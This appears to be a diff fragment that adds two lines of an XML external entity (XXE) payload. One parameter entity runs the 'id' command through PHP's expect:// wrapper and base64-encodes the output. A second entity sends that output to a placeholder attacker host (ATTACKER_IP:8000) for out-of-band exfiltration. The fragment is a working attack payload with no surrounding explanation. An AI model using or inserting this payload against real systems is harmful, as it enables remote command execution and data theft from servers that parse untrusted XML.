@@ -1,0 +1,2 @@
+<!ENTITY % xxePayload SYSTEM "php://filter/read=convert.base64-encode/resource=expect://id">
+<!ENTITY % internal "<!ENTITY &#37; xxe SYSTEM 'http://ATTACKER_IP:8000/?command-result?%xxePayload;'>">
